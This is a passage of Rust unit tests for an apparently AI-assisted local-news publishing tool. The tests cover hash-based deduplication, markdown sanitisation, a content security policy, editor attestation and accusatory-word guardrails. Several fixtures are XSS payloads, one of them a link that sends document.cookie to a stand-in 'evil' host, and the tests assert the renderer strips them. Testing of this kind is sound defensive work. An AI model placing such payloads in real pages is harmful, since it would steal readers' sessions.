        // The external listener is untouched and still accepting connections.
        assert!(
            crate::core::llm::OllamaSidecar::port_in_use(&addr),
            "an external listener must survive start(): we never kill processes we did not spawn"
        );
        let child_guard = sidecar.child.lock().unwrap();
        assert!(child_guard.is_none());
    }

    // TEST-001: compute_hash is the sole dedup key for evidence. A silent change
    // to its output (e.g. normalizing whitespace/case, or a crate swap) would
    // re-ingest every item as "new" and flood the lead queue. Pin the algorithm
    // with a golden vector and assert the raw, no-normalization contract.
    #[test]
    fn test_compute_hash_is_stable_and_pinned() {
        use crate::core::scraper::compute_hash;

        // Golden: SHA-256("hello world") as lowercase hex. If this ever changes,
        // dedup semantics changed and every stored content_hash is invalidated.
        assert_eq!(
            compute_hash("hello world"),
            "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
        );

        // Deterministic: same input always hashes the same.
        assert_eq!(
            compute_hash("Council agenda"),
            compute_hash("Council agenda")
        );

        // Distinct inputs hash differently.
        assert_ne!(compute_hash("a"), compute_hash("b"));

        // No normalization: case and surrounding whitespace are significant, so
        // these must NOT collide (otherwise trivially-different excerpts would be
        // treated as duplicates and dropped).
        assert_ne!(compute_hash("Hello"), compute_hash("hello"));
        assert_ne!(compute_hash("agenda"), compute_hash("agenda "));
        assert_ne!(compute_hash("agenda"), compute_hash(" agenda"));
    }

    // TEST-001: extract_entities feeds the Money-Threshold and Watchlist
    // detectors. Pin exactly which dollar amounts and formal-org names a fixture
    // excerpt yields, the empty-on-no-match case, and the sort+dedup contract.
    // Known quirk pinned on purpose: the org regex greedily absorbs a preceding
    // capitalized word, so a sentence-initial "The City Council" is captured with
    // the leading article, while a mid-sentence "the new Parks Department" (after
    // lowercase words) is captured clean. This fixture locks that exact behavior
    // so any change to the regex's leading-word handling is caught as a regression.
    #[test]
    fn test_extract_entities_fixture() {
        use crate::core::scraper::extract_entities;

        let excerpt = "The City Council approved $1,250,000 for the new Parks Department. \
                       The School Board also met. Total was $500. A refund of $500 was issued.";
        let entities = extract_entities(excerpt);

        // Sorted (ASCII: '$' < uppercase letters) and de-duplicated ($500 twice).
        assert_eq!(
            entities,
            vec![
                "$1,250,000".to_string(),
                "$500".to_string(),
                "Parks Department".to_string(),
                "The City Council".to_string(),
                "The School Board".to_string(),
            ]
        );

        // Negative case: prose with no dollar amounts and no capitalized
        // org-suffix phrase yields nothing (lowercase "council" must not match).
        assert!(extract_entities("the council met to discuss the budget at city hall.").is_empty());
    }

    // ===== Editorial trust boundary (GG-B1/B2/C1 + re-audit M1/M5/NEW-3/NEW-4) =====

    // GG-B1: render_markdown must neutralize dangerous URI schemes on markdown
    // links/images while preserving safe / relative / fragment / evidence dests.
    #[test]
    fn test_render_markdown_neutralizes_dangerous_uri_schemes() {
        use crate::core::compiler::render_markdown;
        for md in [
            "[click](javascript:alert(1))",
            "[c](JAVASCRIPT:alert(1))",
            "![x](data:text/html;base64,PHNjcmlwdD4=)",
            "[v](vbscript:msgbox(1))",
        ] {
            let out = render_markdown(md).to_lowercase();
            assert!(
                !out.contains("href=\"javascript:"),
                "javascript href survived: {md} -> {out}"
            );
            assert!(
                !out.contains("src=\"javascript:"),
                "javascript src survived: {md} -> {out}"
            );
            assert!(
                !out.contains("href=\"data:"),
                "data href survived: {md} -> {out}"
            );
            assert!(
                !out.contains("src=\"data:"),
                "data src survived: {md} -> {out}"
            );
            assert!(
                !out.contains("vbscript:"),
                "vbscript survived: {md} -> {out}"
            );
        }
        let safe = render_markdown(
            "[a](https://example.gov) [b](mailto:x@example.gov) [c](evidence:42) [d](../about.html) [e](#s)",
        );
        assert!(
            safe.contains("href=\"https://example.gov\""),
            "https stripped: {safe}"
        );
        assert!(
            safe.contains("href=\"mailto:x@example.gov\""),
            "mailto stripped: {safe}"
        );
        assert!(
            safe.contains("href=\"evidence:42\""),
            "evidence stripped: {safe}"
        );
        assert!(
            safe.contains("href=\"../about.html\""),
            "relative stripped: {safe}"
        );
        assert!(safe.contains("href=\"#s\""), "fragment stripped: {safe}");
    }

    // GG-B1 + GG-C1: a javascript: markdown link in a draft body must not reach the
    // compiled site; every page carries the CSP and the reader AI-disclosure.
    #[test]
    fn test_compiled_site_blocks_markdown_xss_csp_and_discloses_ai() {
        let conn = init_db("file:test_compiled_site_xss?mode=memory&cache=shared").unwrap();
        let temp_dir = tempdir().unwrap();
        let draft_id = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "Safe Title".to_string(),
                content: "Read [the report](javascript:fetch('//evil/'+document.cookie)) now."
                    .to_string(),
                status: "published".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        crate::core::db::attest_draft(&conn, draft_id, "Test Editor").unwrap();

        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
        let post =
            std::fs::read_to_string(temp_dir.path().join(format!("stories/{}.html", draft_id)))
                .unwrap();
        let lower = post.to_lowercase();
        assert!(
            !lower.contains("href=\"javascript:"),
            "javascript href reached post: {post}"
        );
        assert!(post.contains("the report"), "link text missing");
        assert!(
            post.contains("Content-Security-Policy"),
            "CSP missing from post"
        );
        assert!(
            post.contains("script-src 'none'"),
            "CSP script-src 'none' missing"
        );
        assert!(
            post.contains("ai-disclosure"),
            "AI disclosure missing from post"
        );
        let index = std::fs::read_to_string(temp_dir.path().join("index.html")).unwrap();
        assert!(
            index.contains("Content-Security-Policy"),
            "CSP missing from index"
        );
        assert!(
            index.contains("ai-disclosure"),
            "AI disclosure missing from index"
        );
    }

    // GG-B2 + GG-C1 + M1: the compile sink requires attestation AND (clean OR
    // overridden) for EVERY publishable draft, via any path.
    #[test]
    fn test_compile_enforces_attestation_and_guardrail_gate() {
        let conn = init_db("file:test_compile_gate?mode=memory&cache=shared").unwrap();
        let temp_dir = tempdir().unwrap();

        let clean_id = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "Budget Notice".to_string(),
                content: "The council adopted the annual budget (evidence:1).".to_string(),
                status: "published".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        let clean_path = temp_dir.path().join(format!("stories/{}.html", clean_id));

        // (a) Un-attested => skipped.
        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
        assert!(!clean_path.exists(), "un-attested draft must not publish");

        // (b) Attested + clean => publishes.
        crate::core::db::attest_draft(&conn, clean_id, "Editor").unwrap();
        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
        assert!(clean_path.exists(), "attested clean draft should publish");

        // Unclean draft with charge words marked blocking, attested.
        let mut cfg = crate::core::guardrails::load_guardrail_config(&conn);
        cfg.blocking = vec!["fraud".to_string(), "embezzle".to_string()];
        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
        let dirty_id = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "Allegation".to_string(),
                content: "The mayor committed fraud and embezzled funds.".to_string(),
                status: "published".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        crate::core::db::attest_draft(&conn, dirty_id, "Editor").unwrap();
        let dirty_path = temp_dir.path().join(format!("stories/{}.html", dirty_id));

        // (c) Attested but unclean + no override => skipped.
        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
        assert!(
            !dirty_path.exists(),
            "attested-but-unclean draft must not publish without override"
        );

        // (d) With a logged override => publishes.
        crate::core::db::record_guardrail_override(&conn, dirty_id, "Verified against indictment.")
            .unwrap();
        compile_static_site(&conn, temp_dir.path().to_str().unwrap(), "{}").unwrap();
        assert!(dirty_path.exists(), "overridden draft should publish");
    }

    // GG-C1: attestation/override gate columns round-trip (proves migration 0008).
    #[test]
    fn test_attest_and_override_gate_columns() {
        let conn = init_db("file:test_attest_gate?mode=memory&cache=shared").unwrap();
        let id = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "brief".to_string(),
                title: "Notice".to_string(),
                content: "The council adopted the minutes.".to_string(),
                status: "draft_generated".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        let (att, ov) = crate::core::db::get_draft_publish_gate(&conn, id).unwrap();
        assert!(att.is_none() && ov.is_none(), "new draft has no gate state");
        crate::core::db::attest_draft(&conn, id, "Jane Editor").unwrap();
        crate::core::db::record_guardrail_override(&conn, id, "documented").unwrap();
        let (att2, ov2) = crate::core::db::get_draft_publish_gate(&conn, id).unwrap();
        assert!(
            !att2.unwrap().trim().is_empty(),
            "attested_at should be set"
        );
        assert_eq!(ov2.unwrap(), "documented");
    }

    // Editable guardrails: defaults are warn-only, round-trip works, and a blocking
    // word not in either list is dropped on save (RE-AUDIT NEW-4).
    #[test]
    fn test_guardrail_config_round_trip_and_blocking_validation() {
        let mut conn = Connection::open_in_memory().unwrap();
        run_migrations(&mut conn).unwrap();
        let def = crate::core::guardrails::load_guardrail_config(&conn);
        assert!(
            !def.accusatory.is_empty(),
            "default accusatory list non-empty"
        );
        assert!(def.blocking.is_empty(), "default must be warn-only");
        let cfg = crate::core::guardrails::GuardrailConfig {
            accusatory: vec!["bribe".to_string()],
            legal: vec!["indicted".to_string()],
            blocking: vec!["bribe".to_string(), "not-a-listed-word".to_string()],
        };
        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
        let loaded = crate::core::guardrails::load_guardrail_config(&conn);
        assert_eq!(loaded.accusatory, vec!["bribe".to_string()]);
        assert_eq!(
            loaded.blocking,
            vec!["bribe".to_string()],
            "unlisted blocking word must be dropped"
        );
    }

    // RE-AUDIT M5/M1: directly test the publish-gate function (attestation,
    // guardrail block, override, empty-override rejection, non-publish bypass,
    // and that 'corrected' is gated).
    #[test]
    fn test_enforce_publish_gate_directly() {
        use crate::tauri_cmds::enforce_publish_gate;
        let conn = init_db("file:test_enforce_gate?mode=memory&cache=shared").unwrap();
        let id = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "T".to_string(),
                content: "The council adopted the budget (evidence:1).".to_string(),
                status: "draft_generated".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();

        // Non-publish transitions always pass without attestation.
        assert!(enforce_publish_gate(&conn, id, "hold", None).is_ok());
        assert!(enforce_publish_gate(&conn, id, "killed", None).is_ok());

        // Publish without attestation => ATTESTATION_REQUIRED; 'corrected' gated too (M1).
        assert!(enforce_publish_gate(&conn, id, "ready_to_publish", None)
            .unwrap_err()
            .starts_with("ATTESTATION_REQUIRED"));
        assert!(enforce_publish_gate(&conn, id, "corrected", None)
            .unwrap_err()
            .starts_with("ATTESTATION_REQUIRED"));

        // Attest => clean draft passes.
        crate::core::db::attest_draft(&conn, id, "Editor").unwrap();
        assert!(enforce_publish_gate(&conn, id, "ready_to_publish", None).is_ok());

        // Unclean (blocking) draft: blocked without override, with whitespace
        // override, and passes only with a real override (which is recorded).
        let mut cfg = crate::core::guardrails::load_guardrail_config(&conn);
        cfg.blocking = vec!["fraud".to_string()];
        crate::core::guardrails::save_guardrail_config(&conn, &cfg).unwrap();
        let bad = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "B".to_string(),
                content: "The official committed fraud.".to_string(),
                status: "draft_generated".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        crate::core::db::attest_draft(&conn, bad, "Editor").unwrap();
        assert!(enforce_publish_gate(&conn, bad, "published", None)
            .unwrap_err()
            .starts_with("GUARDRAILS_BLOCKED"));
        assert!(
            enforce_publish_gate(&conn, bad, "published", Some("   "))
                .unwrap_err()
                .starts_with("GUARDRAILS_BLOCKED"),
            "whitespace override must not count"
        );
        assert!(enforce_publish_gate(&conn, bad, "published", Some("Verified.")).is_ok());
        let (_a, ov) = crate::core::db::get_draft_publish_gate(&conn, bad).unwrap();
        assert_eq!(ov.unwrap(), "Verified.");
    }

    // RE-AUDIT NEW-3: whole-word/inflection matching avoids substring false
    // positives but still catches real inflections.
    #[test]
    fn test_guardrail_word_boundary_avoids_false_positives() {
        let conn = init_db("file:test_word_boundary?mode=memory&cache=shared").unwrap();
        let benign = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "T".to_string(),
                content: "The surcharged invoice for scampi at the theftproof vault was filed."
                    .to_string(),
                status: "draft_generated".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        let r = run_guardrails_check(&conn, benign).unwrap();
        assert!(
            !r.issues.iter().any(|i| i.category == "Accusatory Language"),
            "must not fire on surcharged/scampi/theftproof: {:?}",
            r.issues
        );

        let inflected = insert_draft(
            &conn,
            &Draft {
                id: None,
                lead_id: None,
                format: "story".to_string(),
                title: "T".to_string(),
                content: "The treasurer embezzled the funds.".to_string(),
                status: "draft_generated".to_string(),
                verification_checklist: "[]".to_string(),
                missing_evidence_notes: None,
                correction_note: None,
                created_at: Utc::now().to_rfc3339(),
                updated_at: Utc::now().to_rfc3339(),
            },
        )
        .unwrap();
        let r2 = run_guardrails_check(&conn, inflected).unwrap();
        assert!(
            r2.issues
                .iter()
                .any(|i| i.category == "Accusatory Language"),
            "inflected 'embezzled' should still match 'embezzle'"
        );
    }
}
